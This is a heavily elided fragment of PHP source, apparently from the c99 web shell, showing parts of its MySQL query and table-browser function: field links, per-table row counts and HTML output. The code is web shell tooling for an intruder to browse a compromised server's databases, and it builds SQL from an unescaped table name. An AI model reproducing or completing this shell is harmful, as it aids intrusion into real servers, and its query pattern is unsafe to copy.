...
function mysql_query_form()
{
 ...
 if ((!$submit) or ($sql_act))
 {
  ...
  if ($tbl_struct)
  {
   ...
   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "ª <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
   echo "</td></tr></table>";
  }
 }
 ...
 else
 {
  ...
  if (!empty($sql_db))
  {
   ...
   else
   {
    ...
    $c = 0;
    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>ª&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
   ...
   if ($diplay)
   {
    ...
    else
    {
     ...
     else
     {
      ...
      echo "<td><center><b>ª</b></center></td>";
